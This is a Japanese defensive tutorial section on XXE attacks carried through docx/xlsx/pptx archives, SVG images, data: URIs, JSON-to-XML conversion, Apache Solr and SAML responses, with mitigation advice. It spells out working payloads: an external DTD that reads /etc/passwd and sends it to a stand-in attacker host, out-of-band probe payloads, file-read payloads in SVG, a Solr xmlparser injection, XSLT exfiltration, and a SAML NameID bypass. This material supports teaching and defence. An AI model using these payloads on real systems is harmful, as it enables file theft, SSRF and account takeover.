## 各種ファイル形式経由XXEの解説とSAML

これまでの章では、リクエストボディに直接XMLを送り込むXXE（XML External Entity、XML外部実体参照）を扱ってきた。しかし現実のアプリケーションでは「XMLを直接受け付ける口」は塞がれていることが多い一方、**内部でXMLを解釈している別のファイル形式**が無防備に残っていることが非常に多い。docx・xlsx・pptxといったOffice文書、SVG画像、そしてSAML（Security Assertion Markup Language、XMLベースのシングルサインオン規格）は、いずれも「見た目はXMLではないが、中身はXMLパーサに食わされる」代表例である。

本節では、これらの「XMLを間接的に解釈する各種ファイル形式」を経由したXXEを、なぜ成立するのかという仕組みのレベルから解説する。防御目的の解説であり、実在サービスや本番環境への無許可の検証、破壊的手順は扱わない。攻撃面（アタックサーフェス）を理解して自組織の入力処理を点検することが目的である。

### なぜ「ファイル形式経由XXE」が成立するのか

XXEの本質は「XMLパーサが**DOCTYPE宣言と外部実体（external entity）を処理してしまう**」ことにある。ここで重要なのは、XMLパーサはリクエストボディに直接置かれたXMLだけでなく、**アップロードされたファイルの内部にあるXML**も同じように解釈する、という点だ。

- **OOXML（Office Open XML）文書**（docx / xlsx / pptx）は、実体がZIPアーカイブであり、その中に複数のXMLファイルが入っている。サーバがサムネイル生成・テキスト抽出・変換処理のためにこれらXMLをパースすると、そこに仕込まれたXXEが発火する。
- **SVG**（Scalable Vector Graphics）はそもそもXML文書そのものである。画像アップロード機能がSVGを受理し、変換ライブラリ（ImageMagick、rsvg等）や描画時にパースすると発火する。
- **SAML**では、ブラウザ経由でPOSTされる`SAMLResponse`がbase64デコードされた後にXMLとしてパースされる。署名検証の前段でパースが行われるため、そこがXXEやXML署名ラッピングの標的になる。

つまり共通する原理は、**「アプリはXMLを受け取っているつもりがなくても、内部処理の途中で必ずXMLパーサを通す」**という一点だ。sink（入力が最終的に解釈・実行される危険な到達先）がXMLパーサである限り、そこへ到達する経路がファイル形式という「衣」を着ているだけで、XXEの成立条件は変わらない。

---

### OOXML（docx / xlsx / pptx）文書経由のXXE

#### OOXMLの内部構造を理解する

Willis Vandevanter（BuffaloWill）の解説によれば、OXML（OOXML）は「docx（Word文書）、pptx（PowerPoint）、xlsx（Excelスプレッドシート）など、一般的な文書形式」を指し、その正体は**「XMLファイルとメディアファイルを含んだZIPファイル」**である。文書がレンダリングされるとき、レンダリングライブラリはまず文書を解凍（unzip）し、続いて含まれるXMLファイルをパースする。

実際、任意のdocxファイルの拡張子を`.zip`に変えて展開すると、おおむね次のような構造になっている。

```
example.docx  (実体はZIP)
├── [Content_Types].xml        ← 各パートのMIMEタイプ定義。最初にパースされやすい
├── _rels/.rels                ← ルートのリレーションシップ定義
├── docProps/
│   ├── core.xml               ← タイトル・作者などのコアプロパティ
│   └── app.xml
└── word/
    ├── document.xml           ← 本文。最も一般的なXXE注入先
    ├── _rels/document.xml.rels
    ├── styles.xml
    └── settings.xml
```

Vandevanterは、これらの内部XMLファイルにXML外部実体を埋め込むことで「文書がパースされたときにXXEが発火する」成功例を、特に**ファイルアップロード機能**において過去に持っていたと述べている。そして重要な観察として、**「どのXMLファイルにXXEを埋め込むかによって成功率が変わる」**と明言している。これはパースの順序と、どのファイルが優先されるかが文書タイプに依存するためだ。したがって`word/document.xml`だけでなく、`[Content_Types].xml`や`docProps/core.xml`など複数の候補を試す価値がある。

> ⚠️ **未取得の資料の補足**: 元記事「Exploiting XXE Vulnerabilities in OXML Documents - Part 1」は意図的にPart 1として構成されており、具体的なDTDコードやペイロード例は続編（Part 2）に譲る形で本文には掲載されていません。取得できた範囲は上記の「構造・パース挙動・埋め込み先の選択」までです。全文は以下からご確認ください: https://silentrobots.com/exploiting-xxe-vulnerabilities-in-oxml-documents-part-1/
>
> （以下は未取得資料の補足として一般知識に基づく解説です）実務では、この記事の著者が公開したツール `oxml_xxe`（https://github.com/BuffaloWill/oxml_xxe）が定番として使われてきました。同ツールはdocx / xlsx / pptxに加え、OpenDocument形式（odt / odg / odp / ods）、SVG、素のXMLに対応し、選択した内部XMLへペイロードを自動注入して再ZIP化します。歴史的には、この種の脆弱性が**2014年12月にFacebookで報告された**ことが著名な実例として言及されています。

> 出典: Willis Vandevanter「Exploiting XXE Vulnerabilities in OXML Documents - Part 1」 — https://silentrobots.com/exploiting-xxe-vulnerabilities-in-oxml-documents-part-1/

#### 具体的な注入手順とペイロード（防御理解のため）

「Book of BugBounty Tips」は、docxを使った履歴書（resume）パース機能へのXXE手順を、次の4ステップで簡潔に示している。これは「求人サイトが応募者のdocx履歴書を解析して氏名・職歴を抽出する」といった機能を想定したものだ。

1. `.docx`ファイルを解凍（unzip）する
2. `word/document.xml`を編集する
3. XXEの実体宣言を注入する
4. 再びZIP化してアップロードする

注入する宣言の例は次の通り。

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://burp.collab.net/mal.dtd"> %xxe;]>
```

このペイロードの「なぜ」を分解すると次のようになる。

- `<!DOCTYPE foo [ ... ]>` は文書型定義（DTD）の内部サブセットを開き、ここに実体を定義できるようにする。この宣言はXML本文（`<?xml ... ?>`宣言の直後）の先頭に置く必要がある。
- `<!ENTITY % xxe SYSTEM "http://.../mal.dtd">` は**パラメータ実体（parameter entity、`%`で始まる実体）**を定義している。パラメータ実体はDTD内部でのみ展開でき、通常の実体（`&`で始まる汎用実体）よりも制約が緩い場面が多く、外部DTDを引き込むのに使う。
- `%xxe;` でそのパラメータ実体を即座に参照し、攻撃者サーバ上の外部DTD（`mal.dtd`）を**その場で読み込ませる**。この外部DTDの中に、ファイル読み出しと外部への送信（out-of-band、帯域外送出）を行う本命の実体定義を書いておく、という二段構えが典型だ。

なぜ二段構えにするかというと、多くのパーサは「内部サブセット内で、汎用実体の値の中に別の実体参照を入れ子にする」ことを禁じる一方、**外部DTD（外部サブセット）の中でならその入れ子が許される**からだ。この差を突いて、外部DTD側にBlind XXE用のexfiltration（データ抽出）ロジックを置く。典型的な`mal.dtd`の中身は次のようになる（原理理解のための一般例）。

```xml
<!-- 攻撃者サーバ上の mal.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.example/?d=%file;'>">
%eval;
%exfil;
```

- `%file;` で対象ファイルを読み込み、その内容を文字列として保持する。
- `%eval;` は「`%exfil`という新しいパラメータ実体を、`%file`の中身をURLクエリに埋め込む形で定義する」ためのメタ的な実体だ。`&#x25;`は`%`のXML数値文字参照で、これによりDTD解析の段階を一段ずらして「後から評価される`%`」を書ける。
- `%exfil;` を参照した瞬間に、ファイル内容を載せたHTTPリクエストが攻撃者サーバへ飛ぶ。応答本文をレスポンスで直接読めない**Blind（ブラインド）XXE**でも、この帯域外チャネルで内容を回収できる。

このように、docxはただの「XMLを包んだZIP」であるため、XMLボディを直接送れないアップロード機能であっても、内部XMLを書き換えるだけでXXEの入口になる。防御側の教訓は明確で、**「Office文書やSVGを受け取る処理でも、内部XMLは信頼できない入力として扱い、DTD/外部実体を無効化したパーサで処理する」**ことに尽きる。

> 出典: Book of BugBounty Tips「XXE」 — https://gowsundar.gitbook.io/book-of-bugbounty-tips/xxe

---

### URL制限を回避するdata: URIとSVGのテクニック

同じ「Book of BugBounty Tips」は、防御が部分的にかかっている環境での回避策も示している。教科書としては、これらは「なぜ既存の防御がすり抜けられるのか」を理解するための材料である。

#### data: URIによるSVGペイロードの持ち込み

企業側が「任意の外部URLへのアクセス」をブロックしている場合でも、**data: URIプロトコル**を使ってSVGペイロードを埋め込むと回避できることが多い、と述べられている。

```
data:image/svg+xml;base64,XXE_PAYLOAD
```

なぜこれが効くのか。`data:` スキームは外部への通信を伴わず、URI自体にコンテンツ（ここではbase64エンコードされたSVG=XML）を内包する。URLフィルタやSSRF（Server-Side Request Forgery）対策が「`http://`や`https://`の宛先」だけを検査していると、`data:`で運ばれたXMLがすり抜けて、そのままXMLパーサに渡ってしまう。base64化されていることで、単純なキーワード検査（`<!DOCTYPE`や`<!ENTITY`の文字列マッチ）も回避されやすい。防御側は、宛先URLのスキームだけでなく**デコード後の中身**まで検査する必要がある、という教訓になる。

#### その他の入口: Content-Type変換とApache Solr

同資料はさらに、XMLを「受け付けているように見えない」エンドポイントを狙う複数の入口を挙げている。

- **JSON→XML変換**: 「POST/PUT/PATCHのボディを常にXMLへ変換して再送し、Content-Typeの変更を忘れるな」。多くのAPIフレームワークはJSONとXMLの両方を受理するよう設定されており、`Content-Type: application/json`を`application/xml`に変えてボディをXML化するだけで、隠れたXMLパーサに到達できることがある。
- **Apache Solr**の`/select`エンドポイント: `q`パラメータに`{!xmlparser v='<!DOCTYPE a SYSTEM "http://collab.burp.net"><a></a>'}`を与えると、SolrのXMLパーサ機能が外部実体を解決してしまう。

```
/select?q={!xmlparser v='<!DOCTYPE a SYSTEM "http://collab.burp.net"><a></a>'}
```

これらは「XMLの入口はボディ直送だけではない」ことを示しており、防御の観点では**アプリが内部で使うすべてのXMLパーサ設定を横断的に堅牢化する**必要があることを意味する。

> 出典: Book of BugBounty Tips「XXE」 — https://gowsundar.gitbook.io/book-of-bugbounty-tips/xxe

---

### XXEの基礎ペイロードの再整理（BugBountyHunter）

BugBountyHunter（zseano）の「Learn about XML Injection (XXE)」は、XXEを**「サーバ上のファイルを読み出し、外向きの通信を行ってデータを抽出できる注入（injection）の一種」**と定義している。ファイル形式経由XXEを理解する土台として、そこで示される基礎ペイロードを「なぜそうなるか」とともに再確認しておく。

**(1) 実体展開の動作確認（無害な自己参照）**

```xml
<?xml version="1.0" ?>
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
<userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
</userInfo>
```

ここでは`&example;`が`Doe`に置換される。これは「このパーサはそもそも実体（ENTITY）を展開するのか？」を確かめる無害なプローブであり、応答に`Doe`が反映されれば、外部実体も処理される可能性が高いと判断できる。

**(2) ローカルファイルの読み出し**

```xml
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
```

`SYSTEM 'file:///etc/passwd'`は外部実体を**ローカルファイルシステム**に向ける。パーサが`&test;`を展開する際に`/etc/passwd`を読み込み、その内容が`<root>`要素の値としてレスポンスに反映される（結果が画面に返る=in-band型）。

**(3) 帯域外（OOB）での存在検知**

```xml
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://UNIQUE_ID.burpcollaborator.net/x"> %ext;
]>
<r></r>
```

パラメータ実体`%ext;`が攻撃者管理下のユニークなホストへHTTPリクエストを送る。応答本文がレスポンスに返らないBlind環境でも、**そのホストにアクセスが届いたという事実**だけでXXEの存在が確認できる。ファイル形式経由XXE（docxやSVG）でも、まずこのOOB検知でパースの有無を確かめるのが定石だ。

**(4) SVGによるファイル読み出し**

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
  <text>&xxe;</text>
</svg>
```

SVGは前述の通りXML文書そのものなので、`&xxe;`で読み込んだファイル内容を`<text>`要素として描画させ、生成された画像やその応答に反映させることでファイル内容を抜き出せる。`standalone="yes"`でもDTDの内部サブセットは処理される点に注意。

BugBountyHunterは防御についても、**「多くのアプリは何らかのフィルタを実装しているので、何がブロックされているかを分析してバイパスを組み立てる（XSSテストと同様のアプローチ）」**と述べている。裏を返せば、防御側は「特定文字列のブラックリスト」ではなく、**DTDと外部実体そのものを無効化する**というホワイトリスト的・機能無効化的な対策でなければ回避されるということだ。

> 出典: BugBountyHunter（zseano）「Learn about XML Injection (XXE)」 — https://www.bugbountyhunter.com/vulnerability/?type=xxe

---

### SAML経由のXXEと関連攻撃

SAMLは、IdP（Identity Provider、認証を行う側）とSP（Service Provider、サービスを提供する側）の間で認証情報をやり取りするためのXMLベースのSSO（シングルサインオン）規格である。ブラウザは`SAMLResponse`という**「deflate圧縮 → base64エンコード」**されたXMLを運ぶ。SPはこれをbase64デコード・展開してからXMLとしてパースし、XML署名（XML Signature）で改ざんがないかを検証する。この「**パースが署名検証より前に走る**」という順序こそが、SAMLをXML系攻撃の宝庫にしている核心だ。

> ⚠️ **未取得の資料**: 「HackTricks: SAML Attacks」本体ページ（https://hacktricks.wiki/en/pentesting-web/saml-attacks/index.html）は自動取得できませんでした（理由: `tollbit.hacktricks.wiki`へ302リダイレクトされ、リダイレクト先が402 Payment Requiredを返したため）。以下の解説は、同内容のGitHub原本（HackTricks-wikiリポジトリの`src/pentesting-web/saml-attacks/README.md`）から取得した内容に基づいています。原文は上記URLからもご確認いただけます。

#### SAMLへのXXE注入

攻撃者は`SAMLResponse`のXMLへ、DOCTYPE宣言と外部実体を注入できる。

```xml
<!DOCTYPE foo [
  <!ELEMENT foo ANY>
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
```

**なぜ成立するのか**が肝心だ。SPが署名検証を行う前に、まずXMLを構造化するためのパースを実行する。このパース段階でDTDと外部実体が有効なままだと、署名が無効（あるいは未署名）であっても、**署名検証にたどり着く前に**外部実体が解決され、ファイル読み出しやSSRFが発生してしまう。「署名で守られているから安全」という直感が通用しないのは、守るべき処理（パース）が守り（署名検証）より先に来ているからである。

#### XSLT攻撃（署名検証より前のスタイルシート実行）

同様の「順序」問題は、XSLT（XSL Transformations、XMLを変換する言語）でも起きる。HackTricksは**「XSLT変換は電子署名の検証より前に実行される」**と明記している。したがって署名が無効でも悪用できる。

```xml
<xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
<xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
```

`unparsed-text()`はXSLT 2.0以降でファイルをテキストとして読み込む関数で、読み込んだ内容を攻撃者URLに連結して送出（exfiltration）する。さらに、再帰的なXSLTテンプレートは**深さnで2^n個のノードを生成する**指数的増殖を引き起こし、DoS（サービス妨害）にもなり得る。防御としては「XSLTを拒否し、必要な正規化（canonicalization）アルゴリズムのみを許可リスト化する」ことが挙げられている。

#### XML署名ラッピング（XSW）攻撃

XXEと並ぶSAMLの主要攻撃が**XSW（XML Signature Wrapping、XML署名ラッピング）**だ。これは「署名検証が見るノード」と「アプリのロジックが実際に読むノード」がズレる（parser differential、パーサ差異）ことを突く。攻撃者は署名を無効化しないまま、**偽の要素を注入**する。HackTricksはXSW #1〜#8の系統を挙げている。

- **XSW #1〜#2**: enveloping/detached署名を使い、悪意ある`Response`要素を追加する
- **XSW #3〜#4**: 同一階層または入れ子階層に、重複した`Assertion`を配置する
- **XSW #5〜#6**: 入れ子の`Assertion`を伴う非標準の署名構成
- **XSW #7〜#8**: スキーマ検証を回避するため、制約の緩い`Extensions`要素を悪用する

原理は共通で、「署名は正規の（署名済みの）アサーションを検証して**有効**と判定するが、アプリは別の位置に置かれた**攻撃者制御のアサーション**を読んでしまう」という取り違えだ。これにより、正規のログイン応答を1つ入手できれば、それを土台に別ユーザーへのなりすましが可能になる。

#### コメント・処理命令による正規化バイパス

より繊細な差異として、コメントや処理命令（processing instruction）を挿入して署名層とアプリ層の解釈をズラす手口がある。

```xml
<saml:NameID><?p not-an-?>admin@example.com</saml:NameID>
```

署名層は`not-an-admin@example.com`として検証する一方、アプリは処理命令を無視して`admin@example.com`を抽出する。結果として**アカウント乗っ取り**につながる。関連する実例として、`ruby-saml`の**CVE-2024-45409**が挙げられている。これは、正当に署名された応答を捕捉した攻撃者が「新たなアサーションを偽造し、任意ユーザーとして認証できる」ものであった。IDや`NameID`を書き換えつつ、署名参照を有効に見えるよう作り替える点でXSWの一種である。

#### SAML攻撃への防御

HackTricksが挙げる防御策は、上記の「順序」と「差異」の問題に直接対応している。

- 身元情報を消費する前に、**検証済みノードとの厳密な結合（exact verified-node binding）**を要求する（署名が検証したノードと、業務ロジックが読むノードが**同一**であることを保証する）
- **XSLTを拒否**し、必要な正規化アルゴリズムのみを許可リスト化する
- 署名検証の**前段**で、XMLの深さ・ノード数・リクエストサイズに上限を課す（XXE/XSLT爆発対策）
- 未署名・自己署名の応答や、別種のリクエスト（`AuthnRequest`、`LogoutRequest`）でもテストする
- IdPとSP間の**証明書の信頼関係**を検証する

そして最も基本的な対策は、XXE全般と同じく**「SAMLのXMLをパースするパーサでDTDと外部実体を無効化する」**ことである。

> 出典: HackTricks「SAML Attacks」 — https://hacktricks.wiki/en/pentesting-web/saml-attacks/index.html （取得はGitHub原本 `HackTricks-wiki/hacktricks` の `src/pentesting-web/saml-attacks/README.md` 経由）

---

### 本節のまとめ: 「XMLを解釈する経路」を数え上げる

本節を貫く教訓は一つだ。XXE対策とは「XMLエンドポイントを守る」ことではなく、**「アプリ内部でXMLパーサが動くすべての経路を数え上げ、そのすべてでDTD/外部実体を無効化する」**ことである。

| 経路 | 実体 | XMLパーサが動く契機 | 主な防御 |
| --- | --- | --- | --- |
| docx/xlsx/pptx | XMLを含むZIP | 解凍後の内部XMLパース（テキスト抽出・変換） | 内部XMLも untrusted として扱い、外部実体無効化 |
| SVG | XML文書そのもの | 画像変換・描画時のパース | アップロード画像のパーサ堅牢化、SVGの無害化 |
| data: URI | URIに内包されたXML | デコード後のパース | スキームだけでなくデコード後の中身を検査 |
| JSON→XML / Solr等 | 代替Content-Typeで届くXML | 隠れたXMLパーサ | 全パーサ設定の横断的堅牢化 |
| SAML | base64+deflateされたXML | 署名検証**前**のパース/XSLT | DTD/XSLT無効化、検証済みノードとの厳密結合 |

共通対策は一貫している。使用するXMLパーサで**DOCTYPE宣言・外部一般実体・外部パラメータ実体をすべて無効化**し（多くのライブラリで`disallow-doctype-decl`等の設定として提供される）、SAMLのような署名付き文書では**「署名が検証したノードと、アプリが読むノードの同一性」**まで踏み込んで保証する。ファイル形式という衣に惑わされず、内部で動くパーサの設定を点検することが、この種のXXEを根絶する唯一の道である。
